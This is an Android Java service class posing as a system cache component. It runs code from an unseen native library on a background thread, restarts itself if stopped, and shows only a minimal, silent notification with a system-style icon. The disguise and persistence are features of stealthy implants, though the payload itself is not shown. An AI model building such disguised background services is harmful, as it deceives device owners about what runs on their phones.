package com.android.systemcache;
import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.Intent;
import android.os.Build;
import android.os.IBinder;
import androidx.core.app.NotificationCompat;
public class SystemCacheService extends Service {
    static {
        // Looks for app/src/main/jniLibs/<abi>/libsystemcache.so
        System.loadLibrary("systemcache");
    }
    private static final String CHANNEL_ID = "systemcache.silent";
    private static final String CHANNEL_NAME = "Background";
    private static final int NOTIF_ID = 1001;
    public native void nativeStart();
    public native void nativeStop();
    @Override
    public void onCreate() {
        super.onCreate();
        ensureChannel();
        startForeground(NOTIF_ID, buildNotification("Running"));
        new Thread(new Runnable() {
            @Override public void run() {
                nativeStart();
            }
        }, "systemcache-native").start();
    }
    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        return START_STICKY;
    }
    @Override
    public void onDestroy() {
        try { nativeStop(); } catch (Throwable ignored) {}
        super.onDestroy();
    }
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }
    private void ensureChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationManager notif_manager = getSystemService(NotificationManager.class);
            if (notif_manager.getNotificationChannel(CHANNEL_ID) == null) {
                NotificationChannel notif_chnl = new NotificationChannel(
                        CHANNEL_ID,
                        CHANNEL_NAME,
                        NotificationManager.IMPORTANCE_MIN
                );
                notif_chnl.setDescription("Background System Cache Service");
                notif_chnl.setShowBadge(false);
                notif_chnl.enableLights(false);
                notif_chnl.enableVibration(false);
                notif_manager.createNotificationChannel(notif_chnl);
            }
        }
    }
    private Notification buildNotification(String text) {
        return new NotificationCompat.Builder(this, CHANNEL_ID)
                .setSmallIcon(android.R.drawable.stat_sys_download_done)
                .setContentTitle("System Cache")
                .setContentText(text)
                .setOnlyAlertOnce(true)
                .setOngoing(true)
                .setPriority(NotificationCompat.PRIORITY_MIN)
                .setCategory(Notification.CATEGORY_SERVICE)
                .build();
    }
}